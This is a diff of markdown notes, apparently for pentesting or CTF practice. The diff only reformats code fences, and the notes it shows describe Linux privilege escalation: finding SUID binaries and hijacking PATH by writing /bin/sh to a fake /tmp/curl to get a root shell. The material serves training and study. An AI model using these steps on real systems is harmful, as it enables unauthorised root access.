@@ -25,9 +25,9 @@ ex. “chmod 777 file.sh” gives rwx for all 3 sections of the file permissions
 
 Locating files with SUID Bits
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~bash
 find / -perm -u=s -type f 2> /dev/null
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 After locating files/binaries with the SUID Bit enabled, search GTFOBins for additional/potential escalation points
 
@@ -37,9 +37,9 @@ This can be useful if you find a binary/script that has root privs that is calli
 
 Start with locating suid bit binaries/scripts
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~bash
 find / -perm -u=s -type f 2> /dev/null
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 ex. /usr/bin/menu
 
@@ -47,21 +47,21 @@ When you run manual, you notice that the outputs for each option give you output
 
 Echo /bin/sh into a file and name it one of the binary names that is being called from the menu binary/script
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~bash
 echo /bin/sh > /tmp/curl
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 chmod the binary with RWX permissions
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~bash
 chmod 777 /tmp/curl
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 Add the binary as a $PATH environment variable
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~bash
 export PATH=/tmp:$PATH
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 Re-run the menu binary and select the option that has the binary that you just created the file for and you should now have a root shell
 
